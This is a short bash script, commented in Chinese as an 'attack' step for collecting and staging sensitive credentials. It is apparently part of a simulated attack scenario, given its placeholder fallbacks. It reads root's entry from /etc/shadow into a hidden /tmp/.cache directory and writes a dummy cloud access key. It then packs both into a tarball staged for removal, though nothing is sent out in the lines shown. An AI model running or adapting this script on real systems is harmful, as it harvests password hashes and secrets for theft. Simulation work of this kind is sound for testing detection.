#!/usr/bin/env bash
# attack（窗口内）：敏感凭据材料收集与打包暂存。
set -euo pipefail
mkdir -p /tmp/.cache/stage/sensitive
grep -E 'root' /etc/shadow > /tmp/.cache/stage/sensitive/shadow.extract 2>/dev/null || echo 'root:$6$salt$hash' > /tmp/.cache/stage/sensitive/shadow.extract
echo "ak=SK123" > /tmp/.cache/stage/sensitive/cloud.creds
tar czf /tmp/.cache/stage/staging.tar.gz -C /tmp/.cache/stage sensitive
